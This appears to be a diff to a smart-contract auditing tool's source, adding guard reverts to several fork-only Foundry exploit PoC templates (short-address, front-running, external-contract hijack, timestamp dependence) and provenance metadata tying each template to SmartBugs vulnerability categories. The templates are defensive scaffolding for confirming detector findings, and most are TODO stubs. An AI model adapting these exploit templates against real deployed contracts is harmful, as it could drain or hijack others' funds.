-  "42-short-address-attack.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Short Address Attack\n/// @notice Detector: short-address-attack. The target lacks parameter length\n///         validation. If a token contract expects 20-byte addresses, passing\n///         a 19-byte address causes the EVM to right-pad the address with zeros,\n///         drastically changing the destination (often making it look like a\n///         much larger amount to the token).\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt to target's real token transfer.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        // Create an address with a trailing zero (19 bytes)\n        address shortAddr = address(uint160(uint256(keccak256(\"short\"))));\n        \n        // This simulates passing a 19-byte address which gets padded by 0x00.\n        // TODO: Adapt to the target's transfer function.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", shortAddr, 1000 ether)\n        );\n        \n        console.log(\"Call result:\", ok);\n        assertTrue(ok, \"exploit did not reproduce: transfer was not called\");\n    }\n}\n",
-  "43-front-running.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Front-running (Transaction Ordering)\n/// @notice Detector: front-running. A function (e.g., withdraw, claim) is\n///         unprotected and can be front-run by a higher gas-fee transaction\n///         to steal the intended reward or action.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        address victim = makeAddr(\"victim\");\n        address attacker = makeAddr(\"attacker\");\n        \n        // Setup: Victim is about to perform an action (e.g., withdraw)\n        // Attacker observes mempool and sends a higher-gas transaction\n        \n        vm.prank(attacker);\n        // TODO: Adapt to the target's vulnerable function\n        (bool ok,) = target.call(abi.encodeWithSignature(\"claimReward()\"));\n        \n        assertTrue(ok, \"Front-running exploit failed\");\n        console.log(\"Attacker successfully claimed reward before victim\");\n    }\n}\n",
-  "44-external-contract-ref.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Dangerous External Contract Reference\n/// @notice Detector: external-contract-referencing. The target interacts with\n///         an external contract that can be swapped or initialized dangerously,\n///         allowing for reentrancy or state manipulation.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        \n        // Target relies on a setter for an external address\n        // TODO: Adapt to the target's address setter\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"setExternalContract(address)\", attackerEOA)\n        );\n        \n        assertTrue(ok, \"Could not set external contract address\");\n        console.log(\"External dependency successfully hijacked\");\n    }\n}\n",
+  "42-short-address-attack.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Short Address Attack\n/// @notice Detector: short-address-attack. The target lacks parameter length\n///         validation. If a token contract expects 20-byte addresses, passing\n///         a 19-byte address causes the EVM to right-pad the address with zeros,\n///         drastically changing the destination (often making it look like a\n///         much larger amount to the token).\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt to target's real token transfer.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        // TODO: Replace this guard only after implementing target-specific\n        // calldata and an observable before/after exploit-effect assertion.\n        // A successful low-level call alone is not evidence of a vulnerability.\n        revert(\"TEMPLATE_NOT_ADAPTED: target-specific exploit assertion required\");\n        address attackerEOA = makeAddr(\"attacker\");\n        // Create an address with a trailing zero (19 bytes)\n        address shortAddr = address(uint160(uint256(keccak256(\"short\"))));\n        \n        // This simulates passing a 19-byte address which gets padded by 0x00.\n        // TODO: Adapt to the target's transfer function.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", shortAddr, 1000 ether)\n        );\n        \n        console.log(\"Call result:\", ok);\n        assertTrue(ok, \"exploit did not reproduce: transfer was not called\");\n    }\n}\n",
+  "43-front-running.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Front-running (Transaction Ordering)\n/// @notice Detector: front-running. A function (e.g., withdraw, claim) is\n///         unprotected and can be front-run by a higher gas-fee transaction\n///         to steal the intended reward or action.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        // TODO: Replace this guard only after implementing target-specific\n        // calldata and an observable before/after exploit-effect assertion.\n        // A successful low-level call alone is not evidence of a vulnerability.\n        revert(\"TEMPLATE_NOT_ADAPTED: target-specific exploit assertion required\");\n        address victim = makeAddr(\"victim\");\n        address attacker = makeAddr(\"attacker\");\n        \n        // Setup: Victim is about to perform an action (e.g., withdraw)\n        // Attacker observes mempool and sends a higher-gas transaction\n        \n        vm.prank(attacker);\n        // TODO: Adapt to the target's vulnerable function\n        (bool ok,) = target.call(abi.encodeWithSignature(\"claimReward()\"));\n        \n        assertTrue(ok, \"Front-running exploit failed\");\n        console.log(\"Attacker successfully claimed reward before victim\");\n    }\n}\n",
+  "44-external-contract-ref.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Dangerous External Contract Reference\n/// @notice Detector: external-contract-referencing. The target interacts with\n///         an external contract that can be swapped or initialized dangerously,\n///         allowing for reentrancy or state manipulation.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_exploit() public {\n        // TODO: Replace this guard only after implementing target-specific\n        // calldata and an observable before/after exploit-effect assertion.\n        // A successful low-level call alone is not evidence of a vulnerability.\n        revert(\"TEMPLATE_NOT_ADAPTED: target-specific exploit assertion required\");\n        address attackerEOA = makeAddr(\"attacker\");\n        \n        // Target relies on a setter for an external address\n        // TODO: Adapt to the target's address setter\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"setExternalContract(address)\", attackerEOA)\n        );\n        \n        assertTrue(ok, \"Could not set external contract address\");\n        console.log(\"External dependency successfully hijacked\");\n    }\n}\n",
   "45-timestamp-dependence.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Timestamp dependence (miner-controllable block.timestamp)\n/// @notice DASP / SmartBugs-Curated category: time_manipulation. The target gates\n///         a payout, lock, or outcome on `block.timestamp` (or treats it as\n///         entropy). A block producer can shift the timestamp by the consensus\n///         drift (a few seconds, more on some chains) to cross the gate early or\n///         to steer a timestamp-derived \"random\" outcome.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Adapt IVictim to the target's real ABI: the\n///      view that reads the time-gated state, and the entry point the gate\n///      protects.\n///      Passing = the observable state flips with block.timestamp alone (the\n///      gate is producer-controllable) = reproduced.\n///      Failing = the gate does not move with the timestamp, or is bound to a\n///      non-manipulable clock = did NOT reproduce.\n\ninterface IVictim {\n    // TODO: the view that exposes the time-gated state (e.g. isSaleFinished(),\n    // isUnlocked(), winner(), hasEnded()).\n    function isSaleFinished() external view returns (bool);\n    // TODO: the entry the gate protects (claim / withdraw / buy).\n    function claim() external;\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        // The observable the gate controls, read at the forked block time.\n        bool gatedBefore = IVictim(target).isSaleFinished();\n\n        // A block producer nudges the timestamp within the allowed drift. A\n        // gate that is a pure function of block.timestamp moves with it; a\n        // gate bound to a trusted clock does not.\n        vm.warp(block.timestamp + 1 days);\n        bool gatedAfter = IVictim(target).isSaleFinished();\n\n        console.log(\"time-gated state before warp:\", gatedBefore);\n        console.log(\"time-gated state after warp: \", gatedAfter);\n\n        // Reproduced when block.timestamp ALONE flips the gated state.\n        assertTrue(\n            gatedBefore != gatedAfter,\n            \"exploit did not reproduce: the gate does not move with block.timestamp\"\n        );\n    }\n}\n"
 };
 
@@ -222,15 +222,29 @@ export const POC_FALLBACK_BY_DETECTOR: Record<string, string[]> = {
   ]
 };
 
-/** Full fallback catalog: file -> scenario + detectors + SmartBugs category. */
-export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detectors: string[]; smartbugs: string }> = [
+/** Full fallback catalog: file -> scenario + detectors + category + provenance. */
+export const POC_FALLBACK_CATALOG: Array<{
+  file: string;
+  scenario: string;
+  detectors: string[];
+  smartbugs: string;
+  provenance: { kind: "dataset" | "modelled"; category: string; sources: string[]; note?: string };
+}> = [
   {
     "file": "01-reentrancy-classic.t.sol",
     "scenario": "Classic ETH reentrancy drain",
     "detectors": [
       "reentrancy"
     ],
-    "smartbugs": "reentrancy"
+    "smartbugs": "reentrancy",
+    "provenance": {
+      "kind": "dataset",
+      "category": "reentrancy",
+      "sources": [
+        "reentrancy/reentrancy_dao.sol",
+        "reentrancy/simple_dao.sol"
+      ]
+    }
   },
   {
     "file": "02-reentrancy-cross-function.t.sol",
@@ -238,7 +252,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "reentrancy"
     ],
-    "smartbugs": "reentrancy"
+    "smartbugs": "reentrancy",
+    "provenance": {
+      "kind": "dataset",
+      "category": "reentrancy",
+      "sources": [
+        "reentrancy/reentrancy_cross_function.sol"
+      ]
+    }
   },
   {
     "file": "03-reentrancy-erc777.t.sol",
@@ -246,7 +267,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "reentrancy"
     ],
-    "smartbugs": "reentrancy"
+    "smartbugs": "reentrancy",
+    "provenance": {
+      "kind": "dataset",
+      "category": "reentrancy",
+      "sources": [
+        "reentrancy/etherstore.sol"
+      ]
+    }
   },
   {
     "file": "04-reentrancy-erc721.t.sol",
@@ -254,7 +282,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "reentrancy"
     ],
-    "smartbugs": "reentrancy"
+    "smartbugs": "reentrancy",
+    "provenance": {
+      "kind": "dataset",
+      "category": "reentrancy",
+      "sources": [
+        "reentrancy/reentrancy_bonus.sol"
+      ]
+    }
   },
   {
     "file": "05-reentrancy-read-only.t.sol",
@@ -262,7 +297,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "read-only-reentrancy"
     ],
-    "smartbugs": "reentrancy"
+    "smartbugs": "reentrancy",
+    "provenance": {
+      "kind": "dataset",
+      "category": "reentrancy",
+      "sources": [
+        "reentrancy/modifier_reentrancy.sol"
+      ]
+    }
   },
   {
     "file": "06-open-drain.t.sol",
@@ -270,7 +312,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unprotected-ether"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/mapping_write.sol"
+      ]
+    }
   },
   {
     "file": "07-unprotected-admin.t.sol",
@@ -278,7 +327,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unprotected-admin"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/multiowned_vulnerable.sol"
+      ]
+    }
   },
   {
     "file": "07b-unprotected-visibility.t.sol",
@@ -286,7 +342,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "default-visibility"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/incorrect_constructor_name1.sol"
+      ]
+    }
   },
   {
     "file": "08-unprotected-initializer.t.sol",
@@ -294,7 +357,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unprotected-initializer"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/proxy.sol"
+      ]
+    }
   },
   {
     "file": "09-tx-origin-phishing.t.sol",
@@ -303,7 +373,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "tx-origin",
       "bytecode-origin"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/phishable.sol"
+      ]
+    }
   },
   {
     "file": "10-delegatecall-takeover.t.sol",
@@ -313,7 +390,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "bytecode-delegatecall",
       "bytecode-callcode"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/parity_wallet_bug_1.sol"
+      ]
+    }
   },
   {
     "file": "11-proxy-uninitialized-implementation.t.sol",
@@ -322,7 +406,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "unprotected-initializer",
       "bytecode-proxy"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/parity_wallet_bug_2.sol"
+      ]
+    }
   },
   {
     "file": "12-selfdestruct.t.sol",
@@ -331,7 +422,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "selfdestruct",
       "bytecode-selfdestruct"
     ],
-    "smartbugs": "unchecked_low_level_calls"
+    "smartbugs": "unchecked_low_level_calls",
+    "provenance": {
+      "kind": "dataset",
+      "category": "unchecked_low_level_calls",
+      "sources": [
+        "unchecked_low_level_calls/mishandled.sol"
+      ]
+    }
   },
   {
     "file": "13-unchecked-call.t.sol",
@@ -340,7 +438,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "unchecked-call",
       "bytecode-unchecked-call"
     ],
-    "smartbugs": "unchecked_low_level_calls"
+    "smartbugs": "unchecked_low_level_calls",
+    "provenance": {
+      "kind": "dataset",
+      "category": "unchecked_low_level_calls",
+      "sources": [
+        "unchecked_low_level_calls/unchecked_return_value.sol"
+      ]
+    }
   },
   {
     "file": "14-erc20-unchecked-bool.t.sol",
@@ -348,7 +453,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "erc20-unchecked"
     ],
-    "smartbugs": "unchecked_low_level_calls"
+    "smartbugs": "unchecked_low_level_calls",
+    "provenance": {
+      "kind": "dataset",
+      "category": "unchecked_low_level_calls",
+      "sources": [
+        "unchecked_low_level_calls/unchecked_return_value.sol"
+      ]
+    }
   },
   {
     "file": "15-fee-on-transfer.t.sol",
@@ -356,7 +468,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "fee-on-transfer"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "16-oracle-manipulation.t.sol",
@@ -365,7 +483,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "oracle-spot",
       "balance-as-price"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "17-slippage-sandwich.t.sol",
@@ -373,7 +497,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "slippage"
     ],
-    "smartbugs": "front_running"
+    "smartbugs": "front_running",
+    "provenance": {
+      "kind": "dataset",
+      "category": "front_running",
+      "sources": [
+        "front_running/ERC20.sol"
+      ]
+    }
   },
   {
     "file": "18-signature-replay.t.sol",
@@ -381,7 +512,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "signature-replay"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "19-signature-malleability.t.sol",
@@ -389,7 +526,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "signature-malleability"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "20-chain-randomness-timestamp.t.sol",
@@ -399,7 +542,15 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "timestamp",
       "bytecode-timestamp"
     ],
-    "smartbugs": "bad_randomness"
+    "smartbugs": "bad_randomness",
+    "provenance": {
+      "kind": "dataset",
+      "category": "bad_randomness",
+      "sources": [
+        "bad_randomness/guess_the_random_number.sol",
+        "bad_randomness/lottery.sol"
+      ]
+    }
   },
   {
     "file": "21-strict-balance-dos.t.sol",
@@ -407,7 +558,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "strict-balance"
     ],
-    "smartbugs": "denial_of_service"
+    "smartbugs": "denial_of_service",
+    "provenance": {
+      "kind": "dataset",
+      "category": "denial_of_service",
+      "sources": [
+        "denial_of_service/dos_simple.sol"
+      ]
+    }
   },
   {
     "file": "22-msg-value-loop.t.sol",
@@ -415,7 +573,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "msg-value-loop"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "23-unchecked-arithmetic-wrap.t.sol",
@@ -423,7 +587,15 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unchecked-block"
     ],
-    "smartbugs": "arithmetic"
+    "smartbugs": "arithmetic",
+    "provenance": {
+      "kind": "dataset",
+      "category": "arithmetic",
+      "sources": [
+        "arithmetic/integer_overflow_add.sol",
+        "arithmetic/overflow_simple_add.sol"
+      ]
+    }
   },
   {
     "file": "24-div-before-mul.t.sol",
@@ -431,7 +603,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "div-before-mul"
     ],
-    "smartbugs": "arithmetic"
+    "smartbugs": "arithmetic",
+    "provenance": {
+      "kind": "dataset",
+      "category": "arithmetic",
+      "sources": [
+        "arithmetic/integer_overflow_mul.sol"
+      ]
+    }
   },
   {
     "file": "25-encode-packed-collision.t.sol",
@@ -439,7 +618,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "encode-packed"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "26-assembly-arbitrary-sstore.t.sol",
@@ -448,7 +633,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "assembly-sstore",
       "assembly-param-sstore"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/arbitrary_location_write_simple.sol"
+      ]
+    }
   },
   {
     "file": "27-extcodesize-bypass.t.sol",
@@ -456,7 +648,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "extcodesize"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/FibonacciBalance.sol"
+      ]
+    }
   },
   {
     "file": "28-centralization-owner-rug.t.sol",
@@ -465,7 +664,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "centralization",
       "locked-ether"
     ],
-    "smartbugs": "access_control"
+    "smartbugs": "access_control",
+    "provenance": {
+      "kind": "dataset",
+      "category": "access_control",
+      "sources": [
+        "access_control/multiowned_vulnerable.sol"
+      ]
+    }
   },
   {
     "file": "29-locked-ether.t.sol",
@@ -473,7 +679,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "locked-ether"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "30-zero-address-brick.t.sol",
@@ -481,7 +693,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "zero-address"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "31-gas-assumptions.t.sol",
@@ -490,7 +708,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "eth-gas-stipend",
       "hardcoded-gas"
     ],
-    "smartbugs": "denial_of_service"
+    "smartbugs": "denial_of_service",
+    "provenance": {
+      "kind": "dataset",
+      "category": "denial_of_service",
+      "sources": [
+        "denial_of_service/send_loop.sol"
+      ]
+    }
   },
   {
     "file": "32-storage-collision-upgrade.t.sol",
@@ -500,7 +725,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "unprotected-admin",
       "delegatecall"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "33-shadowing-mismatch.t.sol",
@@ -508,7 +739,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "shadowing"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "34-private-secret-onchain.t.sol",
@@ -516,7 +753,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "private-secret"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "35-flash-loan-generic.t.sol",
@@ -526,7 +769,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "balance-as-price",
       "slippage"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "36-merkle-double-claim.t.sol",
@@ -534,7 +783,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unprotected-ether"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "37-approval-abuse.t.sol",
@@ -542,7 +797,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "erc20-unchecked"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "38-governance-flash-vote.t.sol",
@@ -550,7 +811,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
